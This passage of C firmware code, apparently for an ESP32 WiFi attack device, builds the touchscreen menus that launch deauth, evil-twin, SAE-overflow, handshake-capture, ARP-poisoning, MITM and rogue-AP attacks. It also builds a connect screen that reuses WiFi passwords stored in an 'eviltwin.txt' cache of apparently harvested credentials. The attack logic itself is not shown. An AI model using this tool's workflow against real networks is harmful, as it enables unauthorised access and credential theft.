        memset(&synthetic_event, 0, sizeof(synthetic_event));
        synthetic_event.user_data = (void*)"Deauther";
        attack_event_cb(&synthetic_event);
        return;
    } else if (strcmp(attack_name, "Evil Twin") == 0) {
        show_evil_twin_page();
    } else if (strcmp(attack_name, "SAE Overflow") == 0) {
        // Reuse existing SAE overflow logic
        create_function_page_base("SAE Overflow");
        lv_obj_t *warning_label = lv_label_create(function_page);
        lv_label_set_text(warning_label, "Warning: This will start\nSAE Overflow attack.\n\nSelect ONE network first.\n\nAre you sure?");
        lv_obj_set_style_text_align(warning_label, LV_TEXT_ALIGN_CENTER, 0);
        lv_obj_set_style_text_color(warning_label, ui_text_color(), 0);
        lv_obj_set_style_text_font(warning_label, &lv_font_montserrat_16, 0);
        lv_obj_center(warning_label);
        
        lv_obj_t *btn_bar = lv_obj_create(function_page);
        lv_obj_set_size(btn_bar, lv_pct(100), 50);
        lv_obj_align(btn_bar, LV_ALIGN_BOTTOM_MID, 0, -15);
        lv_obj_set_style_bg_color(btn_bar, ui_bg_color(), 0);
        lv_obj_set_style_border_width(btn_bar, 0, 0);
        lv_obj_clear_flag(btn_bar, LV_OBJ_FLAG_SCROLLABLE);
        lv_obj_set_flex_flow(btn_bar, LV_FLEX_FLOW_ROW);
        lv_obj_set_style_pad_all(btn_bar, 4, 0);
        lv_obj_set_style_pad_gap(btn_bar, 4, 0);
        
        lv_obj_t *back_btn = lv_btn_create(btn_bar);
        lv_obj_set_size(back_btn, 90, 32);
        lv_obj_set_style_bg_color(back_btn, COLOR_MATERIAL_TEAL, LV_STATE_DEFAULT);
        lv_obj_set_style_bg_color(back_btn, lv_color_lighten(COLOR_MATERIAL_TEAL, 30), LV_STATE_PRESSED);
        lv_obj_set_style_border_width(back_btn, 0, 0);
        lv_obj_set_style_radius(back_btn, 8, 0);
        lv_obj_t *back_lbl = lv_label_create(back_btn);
        lv_label_set_text(back_lbl, "BACK");
        lv_obj_set_style_text_color(back_lbl, ui_text_color(), 0);
        lv_obj_center(back_lbl);
        lv_obj_add_event_cb(back_btn, back_to_menu_cb, LV_EVENT_CLICKED, NULL);
        
        lv_obj_t *yes_btn = lv_btn_create(btn_bar);
        lv_obj_set_size(yes_btn, 90, 32);
        lv_obj_set_style_bg_color(yes_btn, COLOR_MATERIAL_GREEN, LV_STATE_DEFAULT);
        lv_obj_set_style_bg_color(yes_btn, lv_color_lighten(COLOR_MATERIAL_GREEN, 30), LV_STATE_PRESSED);
        lv_obj_set_style_border_width(yes_btn, 0, 0);
        lv_obj_set_style_radius(yes_btn, 8, 0);
        lv_obj_t *yes_lbl = lv_label_create(yes_btn);
        lv_label_set_text(yes_lbl, "YES");
        lv_obj_set_style_text_color(yes_lbl, ui_text_color(), 0);
        lv_obj_center(yes_lbl);
        lv_obj_add_event_cb(yes_btn, sae_overflow_yes_btn_cb, LV_EVENT_CLICKED, NULL);
        
    } else if (strcmp(attack_name, "Handshaker") == 0) {
        // Auto-start handshake attack immediately for all networks
        g_handshaker_global_mode = true;
        handshake_yes_btn_cb(NULL);
        
    } else if (strcmp(attack_name, "Sniffer") == 0) {
        // Auto-start Network Observer directly (no confirmation)
        sniffer_yes_btn_cb(NULL);
    } else if (strcmp(attack_name, "ARP Poison") == 0 ||
               strcmp(attack_name, "MITM") == 0 ||
               strcmp(attack_name, "Rogue AP") == 0 ||
               strcmp(attack_name, "WPA-SEC Upload") == 0) {
        // These attacks require exactly one selected network
        int selected_indices[SCAN_RESULTS_MAX_DISPLAY];
        int selected_count = wifi_scanner_get_selected(selected_indices, SCAN_RESULTS_MAX_DISPLAY);
        
        if (selected_count != 1) {
            // Show popup: "Select only one network"
            lv_obj_t *overlay = lv_obj_create(lv_scr_act());
            lv_obj_set_size(overlay, LCD_H_RES, LCD_V_RES);
            lv_obj_set_pos(overlay, 0, 0);
            lv_obj_set_style_bg_color(overlay, ui_bg_color(), 0);
            lv_obj_set_style_bg_opa(overlay, LV_OPA_70, 0);
            lv_obj_set_style_border_width(overlay, 0, 0);
            lv_obj_clear_flag(overlay, LV_OBJ_FLAG_SCROLLABLE);
            lv_obj_add_flag(overlay, LV_OBJ_FLAG_CLICKABLE);
            
            lv_obj_t *dialog = lv_obj_create(overlay);
            lv_obj_set_size(dialog, 280, 120);
            lv_obj_center(dialog);
            lv_obj_set_style_bg_color(dialog, ui_panel_color(), 0);
            lv_obj_set_style_border_color(dialog, COLOR_MATERIAL_ORANGE, 0);
            lv_obj_set_style_border_width(dialog, 2, 0);
            lv_obj_set_style_radius(dialog, 10, 0);
            lv_obj_clear_flag(dialog, LV_OBJ_FLAG_SCROLLABLE);
            
            lv_obj_t *msg = lv_label_create(dialog);
            lv_label_set_text(msg, "Select only one network");
            lv_obj_set_style_text_color(msg, ui_text_color(), 0);
            lv_obj_set_style_text_font(msg, &lv_font_montserrat_16, 0);
            lv_obj_set_style_text_align(msg, LV_TEXT_ALIGN_CENTER, 0);
            lv_obj_align(msg, LV_ALIGN_TOP_MID, 0, 15);
            
            lv_obj_t *ok_btn = lv_btn_create(dialog);
            lv_obj_set_size(ok_btn, 80, 30);
            lv_obj_align(ok_btn, LV_ALIGN_BOTTOM_MID, 0, -5);
            lv_obj_set_style_bg_color(ok_btn, COLOR_MATERIAL_ORANGE, LV_STATE_DEFAULT);
            lv_obj_set_style_border_width(ok_btn, 0, 0);
            lv_obj_set_style_radius(ok_btn, 8, 0);
            lv_obj_t *ok_lbl = lv_label_create(ok_btn);
            lv_label_set_text(ok_lbl, "OK");
            lv_obj_set_style_text_color(ok_lbl, ui_text_color(), 0);
            lv_obj_center(ok_lbl);
            lv_obj_add_event_cb(ok_btn, close_popup_overlay_cb, LV_EVENT_CLICKED, NULL);
        } else {
            // Exactly one network selected - proceed to WiFi Connect screen
            if (strcmp(attack_name, "ARP Poison") == 0) {
                pending_attack_type = PENDING_ATTACK_ARP_POISON;
            } else if (strcmp(attack_name, "MITM") == 0) {
                pending_attack_type = PENDING_ATTACK_MITM;
            } else if (strcmp(attack_name, "Rogue AP") == 0) {
                pending_attack_type = PENDING_ATTACK_ROGUE_AP;
            } else {
                pending_attack_type = PENDING_ATTACK_WPA_SEC;
            }
            show_wifi_connect_screen();
        }
    }
}

// Layer the lab background behind any menu/tile screen.
// Call after create_function_page_base() (which clears any old bg) or after
// tiles_container is set up for the home screen.
static void apply_menu_bg(void)
{
    if (home_bg_img) {
        lv_obj_del(home_bg_img);
        home_bg_img = NULL;
    }
    home_bg_img = lv_img_create(lv_scr_act());
    lv_img_set_src(home_bg_img, &lab_bg);
    lv_obj_align(home_bg_img, LV_ALIGN_CENTER, 0, 0);
    lv_obj_set_style_img_recolor(home_bg_img, lv_color_black(), 0);
    lv_obj_set_style_img_recolor_opa(home_bg_img, LV_OPA_50, 0);
    // Push to back so everything else renders on top
    lv_obj_move_to_index(home_bg_img, 0);

    // Make function_page see-through so the bg image shows between tiles
    if (function_page) {
        lv_obj_set_style_bg_opa(function_page, LV_OPA_TRANSP, 0);
    }
}

// Show main tiles screen (6 tiles)
static void show_main_tiles(void)
{
    // Delete existing tiles container if present
    if (tiles_container) {
        lv_obj_del(tiles_container);
        tiles_container = NULL;
    }
    if (home_bg_img) {
        lv_obj_del(home_bg_img);
        home_bg_img = NULL;
    }

    // Delete function page if present
    if (function_page) {
        lv_obj_del(function_page);
        function_page = NULL;
    }
    reset_function_page_children();

    tiles_container = lv_obj_create(lv_scr_act());
    lv_obj_set_size(tiles_container, lv_pct(100), 290);
    lv_obj_align(tiles_container, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_opa(tiles_container, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(tiles_container, 0, 0);
    lv_obj_set_style_radius(tiles_container, 0, 0);
    lv_obj_set_style_pad_all(tiles_container, 8, 0);
    lv_obj_set_style_pad_gap(tiles_container, 6, 0);
    lv_obj_set_flex_flow(tiles_container, LV_FLEX_FLOW_ROW_WRAP);
    lv_obj_set_flex_align(tiles_container, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_clear_flag(tiles_container, LV_OBJ_FLAG_SCROLLABLE);

    create_tile(tiles_container, LV_SYMBOL_WIFI,        "WiFi",          UI_ACCENT_BLUE,         main_tile_event_cb, "WiFi Menu");
    create_tile(tiles_container, MY_SYMBOL_BLUETOOTH_B, "Bluetooth",    UI_ACCENT_CYAN,         main_tile_event_cb, "Bluetooth");
    create_tile(tiles_container, MY_SYMBOL_CAR,         "Wardrive",     COLOR_MATERIAL_RED,     main_tile_event_cb, "Wardrive");
    create_tile(tiles_container, LV_SYMBOL_SETTINGS,    "Settings",     UI_ACCENT_GREEN,        main_tile_event_cb, "Settings");
    create_tile(tiles_container, LV_SYMBOL_POWER,       "Go Dark",      lv_color_hex(0x8A8FA8), main_tile_event_cb, "Go Dark");

    apply_menu_bg();

    // Show title bar
    lv_obj_clear_flag(title_bar, LV_OBJ_FLAG_HIDDEN);
}

// WiFi Scan Next button callback - shows attack tiles
static void wifi_scan_next_btn_cb(lv_event_t *e)
{
    (void)e;
    show_attack_tiles_screen();
}

// WiFi Scan & Attack screen - scan and show network list with checkboxes
static void show_wifi_scan_attack_screen(void)
{
    // Ensure WiFi mode is active
    if (!ensure_wifi_mode()) {
        ESP_LOGE(TAG, "Failed to switch to WiFi mode for scan");
        return;
    }
    
    create_function_page_base("WiFi Scan & Attack");
    
    // Create centered scanning container with icon and text
    lv_obj_t *scan_container = lv_obj_create(function_page);
    lv_obj_set_size(scan_container, LV_SIZE_CONTENT, LV_SIZE_CONTENT);
    lv_obj_center(scan_container);
    lv_obj_set_style_bg_opa(scan_container, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(scan_container, 0, 0);
    lv_obj_set_flex_flow(scan_container, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(scan_container, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_gap(scan_container, 10, 0);
    
    // WiFi scanning icon
    lv_obj_t *scan_icon = lv_label_create(scan_container);
    lv_label_set_text(scan_icon, LV_SYMBOL_WIFI);
    lv_obj_set_style_text_font(scan_icon, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(scan_icon, ui_text_color(), 0);
    
    // Scanning text
    scan_status_label = lv_label_create(scan_container);
    lv_label_set_text(scan_status_label, "Scanning...");
    lv_obj_set_style_text_color(scan_status_label, ui_text_color(), 0);
    lv_obj_set_style_text_font(scan_status_label, &lv_font_montserrat_20, 0);
    
    // Clear previous selections when user manually starts scan
    wifi_scanner_clear_selections();
    wifi_scanner_clear_targets();
    
    // Start scan
    wifi_scanner_start_scan();
}

// ============================================================================
// WiFi Connect screen + ARP Poison / Rogue AP / WPA-SEC Upload placeholders
// ============================================================================

// STA connection event handler (runs in WiFi task context, NOT LVGL thread)
static void sta_connect_event_handler(void *arg, esp_event_base_t event_base,
                                      int32_t event_id, void *event_data)
{
    (void)arg;
    (void)event_data;
    if (event_id == WIFI_EVENT_STA_CONNECTED) {
        sta_connect_success = true;
    } else if (event_id == WIFI_EVENT_STA_DISCONNECTED) {
        sta_connect_attempt_count++;
        if (sta_connect_attempt_count >= 3) {
            sta_connect_failed = true;
        } else {
            esp_wifi_connect();
        }
    }
}

// LVGL timer callback - polls STA connect flags and updates UI
static void sta_connect_check_timer_cb(lv_timer_t *timer)
{
    (void)timer;
    
    if (sta_connect_success) {
        sta_connect_success = false;
        
        // Unregister event handler
        esp_event_handler_unregister(WIFI_EVENT, WIFI_EVENT_STA_CONNECTED, &sta_connect_event_handler);
        esp_event_handler_unregister(WIFI_EVENT, WIFI_EVENT_STA_DISCONNECTED, &sta_connect_event_handler);
        
        // Stop timer
        if (sta_connect_check_timer) {
            lv_timer_del(sta_connect_check_timer);
            sta_connect_check_timer = NULL;
        }
        
        // Update status
        if (wifi_connect_status_label) {
            lv_label_set_text(wifi_connect_status_label, "Connected!");
            lv_obj_set_style_text_color(wifi_connect_status_label, COLOR_MATERIAL_GREEN, 0);
        }
        
        // Hide Connect button
        if (wifi_connect_btn) {
            lv_obj_add_flag(wifi_connect_btn, LV_OBJ_FLAG_HIDDEN);
        }
        
        // Show Next> button
        if (wifi_connect_next_btn) {
            lv_obj_clear_flag(wifi_connect_next_btn, LV_OBJ_FLAG_HIDDEN);
        }
        
        // Save manually-entered password to eviltwin.txt if not already cached
        if (wifi_connect_ta && wifi_connect_password[0] != '\0') {
            bool already_cached = false;
            int et_count = sd_cache_get_eviltwin_count();
            for (int i = 0; i < et_count; i++) {
                const char *line = sd_cache_get_eviltwin_entry(i);
                if (line == NULL || strlen(line) == 0) continue;
                char parsed_ssid[64] = {0}, parsed_pass[64] = {0};
                const char *p = line;
                while (*p && *p != '"') p++;
                if (*p == '"') p++;
                const char *s = p;
                while (*p && *p != '"') p++;
                size_t slen = p - s;
                if (slen > sizeof(parsed_ssid) - 1) slen = sizeof(parsed_ssid) - 1;
                strncpy(parsed_ssid, s, slen);
                if (*p == '"') p++;
                while (*p && *p != '"') p++;
                if (*p == '"') p++;
                const char *ps = p;
                while (*p && *p != '"') p++;
                size_t plen = p - ps;
                if (plen > sizeof(parsed_pass) - 1) plen = sizeof(parsed_pass) - 1;
                strncpy(parsed_pass, ps, plen);
                if (strcmp(parsed_ssid, wifi_connect_ssid) == 0 &&
                    strcmp(parsed_pass, wifi_connect_password) == 0) {
                    already_cached = true;
                    break;
                }
            }
            if (!already_cached) {
                struct stat st;
                if (stat("/sdcard/lab", &st) != 0) {
                    mkdir("/sdcard/lab", 0777);
                }
                FILE *file = fopen("/sdcard/lab/eviltwin.txt", "a");
                if (file == NULL) {
                    file = fopen("/sdcard/lab/eviltwin.txt", "w");
                    if (file) { fclose(file); file = fopen("/sdcard/lab/eviltwin.txt", "a"); }
                }
                if (file) {
                    fprintf(file, "\"%s\", \"%s\"\n", wifi_connect_ssid, wifi_connect_password);
                    fflush(file);
                    fclose(file);
                    char cache_entry[256];
                    snprintf(cache_entry, sizeof(cache_entry), "\"%s\", \"%s\"",
                             wifi_connect_ssid, wifi_connect_password);
                    sd_cache_add_eviltwin_entry(cache_entry);
                    ESP_LOGI(TAG, "WiFi password saved to eviltwin.txt for SSID: %s", wifi_connect_ssid);
                }
            }
        }
        
    } else if (sta_connect_failed) {
        sta_connect_failed = false;
        
        // Unregister event handler
        esp_event_handler_unregister(WIFI_EVENT, WIFI_EVENT_STA_CONNECTED, &sta_connect_event_handler);
        esp_event_handler_unregister(WIFI_EVENT, WIFI_EVENT_STA_DISCONNECTED, &sta_connect_event_handler);
        
        // Stop timer
        if (sta_connect_check_timer) {
            lv_timer_del(sta_connect_check_timer);
            sta_connect_check_timer = NULL;
        }
        
        // Update status
        if (wifi_connect_status_label) {
            lv_label_set_text(wifi_connect_status_label, "");
        }
        
        // Re-enable Connect button
        if (wifi_connect_btn) {
            lv_obj_clear_state(wifi_connect_btn, LV_STATE_DISABLED);
        }
        
        // Show failure popup
        lv_obj_t *overlay = lv_obj_create(lv_scr_act());
        lv_obj_set_size(overlay, LCD_H_RES, LCD_V_RES);
        lv_obj_set_pos(overlay, 0, 0);
        lv_obj_set_style_bg_color(overlay, ui_bg_color(), 0);
        lv_obj_set_style_bg_opa(overlay, LV_OPA_70, 0);
        lv_obj_set_style_border_width(overlay, 0, 0);
        lv_obj_clear_flag(overlay, LV_OBJ_FLAG_SCROLLABLE);
        lv_obj_add_flag(overlay, LV_OBJ_FLAG_CLICKABLE);
        
        lv_obj_t *dialog = lv_obj_create(overlay);
        lv_obj_set_size(dialog, 300, 120);
        lv_obj_center(dialog);
        lv_obj_set_style_bg_color(dialog, ui_panel_color(), 0);
        lv_obj_set_style_border_color(dialog, COLOR_MATERIAL_RED, 0);
        lv_obj_set_style_border_width(dialog, 2, 0);
        lv_obj_set_style_radius(dialog, 10, 0);
        lv_obj_clear_flag(dialog, LV_OBJ_FLAG_SCROLLABLE);
        
        char fail_msg[96];
        snprintf(fail_msg, sizeof(fail_msg), "Failed to connect to\n%s", wifi_connect_ssid);
        lv_obj_t *msg = lv_label_create(dialog);
        lv_label_set_text(msg, fail_msg);
        lv_obj_set_style_text_color(msg, COLOR_MATERIAL_RED, 0);
        lv_obj_set_style_text_font(msg, &lv_font_montserrat_14, 0);
        lv_obj_set_style_text_align(msg, LV_TEXT_ALIGN_CENTER, 0);
        lv_obj_align(msg, LV_ALIGN_TOP_MID, 0, 10);
        
        lv_obj_t *ok_btn = lv_btn_create(dialog);
        lv_obj_set_size(ok_btn, 80, 30);
        lv_obj_align(ok_btn, LV_ALIGN_BOTTOM_MID, 0, -5);
        lv_obj_set_style_bg_color(ok_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
        lv_obj_set_style_border_width(ok_btn, 0, 0);
        lv_obj_set_style_radius(ok_btn, 8, 0);
        lv_obj_t *ok_lbl = lv_label_create(ok_btn);
        lv_label_set_text(ok_lbl, "OK");
        lv_obj_set_style_text_color(ok_lbl, ui_text_color(), 0);
        lv_obj_center(ok_lbl);
        lv_obj_add_event_cb(ok_btn, close_popup_overlay_cb, LV_EVENT_CLICKED, NULL);
    }
}

// Connect button callback
static void wifi_connect_btn_cb(lv_event_t *e)
{
    (void)e;
    
    // If textarea exists, read password from it
    if (wifi_connect_ta) {
        const char *txt = lv_textarea_get_text(wifi_connect_ta);
        if (txt) {
            strncpy(wifi_connect_password, txt, sizeof(wifi_connect_password) - 1);
            wifi_connect_password[sizeof(wifi_connect_password) - 1] = '\0';
        }
    }
    
    // Ensure WiFi mode is active
    if (!ensure_wifi_mode()) {
        ESP_LOGE(TAG, "Failed to switch to WiFi mode for STA connect");
        return;
    }
    
    // Disable Connect button while connecting
    if (wifi_connect_btn) {
        lv_obj_add_state(wifi_connect_btn, LV_STATE_DISABLED);
    }
    
    // Show connecting status
    if (wifi_connect_status_label) {
        lv_label_set_text(wifi_connect_status_label, "Connecting...");
        lv_obj_set_style_text_color(wifi_connect_status_label, ui_text_color(), 0);
    }
    
    // Reset flags
    sta_connect_success = false;
    sta_connect_failed = false;
    sta_connect_attempt_count = 0;
    
    // Configure STA
    wifi_config_t sta_config = {0};
    strncpy((char *)sta_config.sta.ssid, wifi_connect_ssid, sizeof(sta_config.sta.ssid));
    sta_config.sta.ssid[sizeof(sta_config.sta.ssid) - 1] = '\0';
    strncpy((char *)sta_config.sta.password, wifi_connect_password, sizeof(sta_config.sta.password));
    sta_config.sta.password[sizeof(sta_config.sta.password) - 1] = '\0';
    
    // Ensure STA mode
    wifi_mode_t mode;
    esp_wifi_get_mode(&mode);
    if (mode != WIFI_MODE_STA && mode != WIFI_MODE_APSTA) {
        esp_wifi_set_mode(WIFI_MODE_STA);
    }
    
    esp_wifi_set_config(WIFI_IF_STA, &sta_config);
    
    // Register event handlers
    esp_event_handler_register(WIFI_EVENT, WIFI_EVENT_STA_CONNECTED, &sta_connect_event_handler, NULL);
    esp_event_handler_register(WIFI_EVENT, WIFI_EVENT_STA_DISCONNECTED, &sta_connect_event_handler, NULL);
    
    // Start LVGL timer to poll connection state (every 200ms)
    if (sta_connect_check_timer) {
        lv_timer_del(sta_connect_check_timer);
    }
    sta_connect_check_timer = lv_timer_create(sta_connect_check_timer_cb, 200, NULL);
    
    // Start connection
    ESP_LOGI(TAG, "Connecting to '%s'...", wifi_connect_ssid);
    esp_wifi_connect();
}

// WiFi connect keyboard event callback
static void wifi_connect_keyboard_event_cb(lv_event_t *e)
{
    lv_event_code_t code = lv_event_get_code(e);
    
    if (code == LV_EVENT_VALUE_CHANGED) {
        if (wifi_connect_ta) {
            const char *txt = lv_textarea_get_text(wifi_connect_ta);
            if (txt) {
                strncpy(wifi_connect_password, txt, sizeof(wifi_connect_password) - 1);
                wifi_connect_password[sizeof(wifi_connect_password) - 1] = '\0';
            }
        }
    }
    else if (code == LV_EVENT_READY || code == LV_EVENT_CANCEL) {
        if (wifi_connect_keyboard) {
            lv_obj_add_flag(wifi_connect_keyboard, LV_OBJ_FLAG_HIDDEN);
        }
        if (wifi_connect_btn) {
            const char *txt = wifi_connect_ta ? lv_textarea_get_text(wifi_connect_ta) : NULL;
            if (txt && strlen(txt) > 0) {
                lv_obj_clear_flag(wifi_connect_btn, LV_OBJ_FLAG_HIDDEN);
            } else {
                lv_obj_add_flag(wifi_connect_btn, LV_OBJ_FLAG_HIDDEN);
            }
        }
    }
}

// WiFi connect textarea click callback - show keyboard, hide connect button
static void wifi_connect_ta_event_cb(lv_event_t *e)
{
    (void)e;
    if (wifi_connect_keyboard) {
        lv_obj_clear_flag(wifi_connect_keyboard, LV_OBJ_FLAG_HIDDEN);
    }
    if (wifi_connect_btn) {
        lv_obj_add_flag(wifi_connect_btn, LV_OBJ_FLAG_HIDDEN);
    }
}

// Next> button callback - navigate to the actual attack screen
static void wifi_connect_next_btn_cb(lv_event_t *e)
{
    (void)e;
    
    switch (pending_attack_type) {
        case PENDING_ATTACK_ARP_POISON:
            show_arp_poison_page();
            break;
        case PENDING_ATTACK_MITM:
            show_mitm_page();
            break;
        case PENDING_ATTACK_ROGUE_AP:
            show_rogue_ap_page();
            break;
        case PENDING_ATTACK_WPA_SEC:
            show_wpa_sec_upload_page();
            break;
        default:
            break;
    }
}

// Connect to WiFi screen - lookup password from eviltwin cache or show input
static void show_wifi_connect_screen(void)
{
    create_function_page_base("Connect to WiFi");
    
    // Get the selected network SSID
    int selected_indices[SCAN_RESULTS_MAX_DISPLAY];
    int selected_count = wifi_scanner_get_selected(selected_indices, SCAN_RESULTS_MAX_DISPLAY);
    const wifi_ap_record_t *records = wifi_scanner_get_results_ptr();
    const uint16_t *count_ptr = wifi_scanner_get_count_ptr();
    uint16_t total_count = count_ptr ? *count_ptr : 0;
    
    if (selected_count < 1 || !records || total_count == 0) return;
    
    int idx = selected_indices[0];
    if (idx < 0 || idx >= (int)total_count) return;
    
    const wifi_ap_record_t *ap = &records[idx];
    strncpy(wifi_connect_ssid, (const char *)ap->ssid, sizeof(wifi_connect_ssid) - 1);
    wifi_connect_ssid[sizeof(wifi_connect_ssid) - 1] = '\0';
    memcpy(wifi_connect_bssid, ap->bssid, 6);
    wifi_connect_channel = ap->primary;
    
    // Search eviltwin cache for password
    bool password_found = false;
    wifi_connect_password[0] = '\0';
    
    int et_count = sd_cache_get_eviltwin_count();
    for (int i = 0; i < et_count; i++) {
        const char *line = sd_cache_get_eviltwin_entry(i);
        if (line == NULL || strlen(line) == 0) continue;
        
        // Parse: "SSID", "password"
        char parsed_ssid[64] = {0};
        char parsed_pass[64] = {0};
        const char *p = line;
        
        while (*p && *p != '"') p++;
        if (*p == '"') p++;
        const char *ssid_start = p;
        while (*p && *p != '"') p++;
        size_t ssid_len = p - ssid_start;
        if (ssid_len > sizeof(parsed_ssid) - 1) ssid_len = sizeof(parsed_ssid) - 1;
        strncpy(parsed_ssid, ssid_start, ssid_len);
        
        if (*p == '"') p++;
        while (*p && *p != '"') p++;
        if (*p == '"') p++;
        const char *pass_start = p;
        while (*p && *p != '"') p++;
        size_t pass_len = p - pass_start;
        if (pass_len > sizeof(parsed_pass) - 1) pass_len = sizeof(parsed_pass) - 1;
        strncpy(parsed_pass, pass_start, pass_len);
        
        if (strcmp(parsed_ssid, wifi_connect_ssid) == 0) {
            strncpy(wifi_connect_password, parsed_pass, sizeof(wifi_connect_password) - 1);
            wifi_connect_password[sizeof(wifi_connect_password) - 1] = '\0';
            password_found = true;
            break;
        }
    }
    
    // Content panel (opaque dark bg, same technique as Snifferdog)
    lv_obj_t *content = lv_obj_create(function_page);
    lv_obj_set_size(content, lv_pct(100), LCD_V_RES - 30 - 70);
    lv_obj_align(content, LV_ALIGN_TOP_MID, 0, 30);
    lv_obj_set_style_bg_color(content, ui_bg_color(), 0);
    lv_obj_set_style_border_width(content, 0, 0);
    lv_obj_set_style_radius(content, 0, 0);
    lv_obj_set_style_pad_all(content, 15, 0);
    lv_obj_set_style_pad_gap(content, 10, 0);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(content, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START);
    
    // SSID label
    lv_obj_t *ssid_title = lv_label_create(content);
    lv_label_set_text(ssid_title, "Network:");
    lv_obj_set_style_text_font(ssid_title, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(ssid_title, ui_text_color(), 0);
    
    lv_obj_t *ssid_val = lv_label_create(content);
    lv_label_set_text(ssid_val, wifi_connect_ssid);
    lv_obj_set_style_text_font(ssid_val, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(ssid_val, ui_text_color(), 0);
    
    if (password_found) {
        lv_obj_t *pass_title = lv_label_create(content);
        lv_label_set_text(pass_title, "Password:");
        lv_obj_set_style_text_font(pass_title, &lv_font_montserrat_14, 0);
        lv_obj_set_style_text_color(pass_title, ui_text_color(), 0);
        
        lv_obj_t *pass_val = lv_label_create(content);
        lv_label_set_text(pass_val, wifi_connect_password);
        lv_obj_set_style_text_font(pass_val, &lv_font_montserrat_16, 0);
        lv_obj_set_style_text_color(pass_val, COLOR_MATERIAL_GREEN, 0);
    } else {
        lv_obj_t *pass_title = lv_label_create(content);
        lv_label_set_text(pass_title, "Password:");
        lv_obj_set_style_text_font(pass_title, &lv_font_montserrat_14, 0);
        lv_obj_set_style_text_color(pass_title, ui_text_color(), 0);
        
        wifi_connect_ta = lv_textarea_create(content);
        lv_obj_set_width(wifi_connect_ta, lv_pct(100));
        lv_textarea_set_one_line(wifi_connect_ta, true);
        lv_textarea_set_text(wifi_connect_ta, "");
        lv_textarea_set_placeholder_text(wifi_connect_ta, "Enter password...");
        lv_obj_set_style_bg_color(wifi_connect_ta, ui_bg_color(), 0);
        lv_obj_set_style_text_color(wifi_connect_ta, ui_text_color(), 0);
        lv_obj_set_style_border_color(wifi_connect_ta, ui_accent_color(), 0);
        lv_obj_add_event_cb(wifi_connect_ta, wifi_connect_ta_event_cb, LV_EVENT_CLICKED, NULL);
        
        wifi_connect_keyboard = lv_keyboard_create(function_page);
        lv_keyboard_set_textarea(wifi_connect_keyboard, wifi_connect_ta);
        lv_keyboard_set_mode(wifi_connect_keyboard, LV_KEYBOARD_MODE_TEXT_LOWER);
        lv_obj_set_size(wifi_connect_keyboard, lv_pct(100), lv_pct(40));
        lv_obj_align(wifi_connect_keyboard, LV_ALIGN_BOTTOM_MID, 0, 0);
        
        lv_obj_set_style_bg_color(wifi_connect_keyboard, ui_bg_color(), LV_PART_MAIN);
        lv_obj_set_style_text_color(wifi_connect_keyboard, ui_text_color(), LV_PART_MAIN);
        lv_obj_set_style_bg_color(wifi_connect_keyboard, lv_color_make(0, 100, 0), LV_PART_ITEMS);
        lv_obj_set_style_bg_color(wifi_connect_keyboard, lv_color_make(0, 150, 0), LV_PART_ITEMS | LV_STATE_PRESSED);
        lv_obj_set_style_text_color(wifi_connect_keyboard, ui_text_color(), LV_PART_ITEMS);
        lv_obj_set_style_border_color(wifi_connect_keyboard, ui_border_color(), LV_PART_ITEMS);
        lv_obj_set_style_border_width(wifi_connect_keyboard, 1, LV_PART_ITEMS);
        
        lv_obj_add_event_cb(wifi_connect_keyboard, wifi_connect_keyboard_event_cb, LV_EVENT_VALUE_CHANGED, NULL);
        lv_obj_add_event_cb(wifi_connect_keyboard, wifi_connect_keyboard_event_cb, LV_EVENT_READY, NULL);
        lv_obj_add_event_cb(wifi_connect_keyboard, wifi_connect_keyboard_event_cb, LV_EVENT_CANCEL, NULL);
        
        lv_obj_add_flag(wifi_connect_keyboard, LV_OBJ_FLAG_HIDDEN);
    }
    
    // Status label
    wifi_connect_status_label = lv_label_create(content);
    lv_label_set_text(wifi_connect_status_label, "");
    lv_obj_set_style_text_font(wifi_connect_status_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(wifi_connect_status_label, ui_text_color(), 0);
    
    wifi_connect_btn = lv_btn_create(function_page);
    lv_obj_set_size(wifi_connect_btn, 120, 40);
    lv_obj_align(wifi_connect_btn, LV_ALIGN_BOTTOM_LEFT, 10, -10);
    lv_obj_set_style_border_width(wifi_connect_btn, 0, 0);
    lv_obj_set_style_radius(wifi_connect_btn, 8, 0);
    lv_obj_t *conn_lbl = lv_label_create(wifi_connect_btn);
    lv_label_set_text(conn_lbl, "Connect");
    lv_obj_set_style_text_color(conn_lbl, ui_text_color(), 0);
    lv_obj_set_style_text_font(conn_lbl, &lv_font_montserrat_14, 0);
    lv_obj_center(conn_lbl);
    lv_obj_add_event_cb(wifi_connect_btn, wifi_connect_btn_cb, LV_EVENT_CLICKED, NULL);
    if (!password_found) {
        lv_obj_add_flag(wifi_connect_btn, LV_OBJ_FLAG_HIDDEN);
    }

    wifi_connect_next_btn = lv_btn_create(function_page);
    lv_obj_set_size(wifi_connect_next_btn, 120, 40);
    lv_obj_align(wifi_connect_next_btn, LV_ALIGN_BOTTOM_LEFT, 10, -10);
    lv_obj_set_style_bg_color(wifi_connect_next_btn, COLOR_MATERIAL_GREEN, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(wifi_connect_next_btn, lv_color_lighten(COLOR_MATERIAL_GREEN, 30), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(wifi_connect_next_btn, 0, 0);
    lv_obj_set_style_radius(wifi_connect_next_btn, 8, 0);
    lv_obj_t *next_lbl = lv_label_create(wifi_connect_next_btn);
    lv_label_set_text(next_lbl, "Next >");
    lv_obj_set_style_text_color(next_lbl, ui_text_color(), 0);
    lv_obj_set_style_text_font(next_lbl, &lv_font_montserrat_14, 0);
    lv_obj_center(next_lbl);
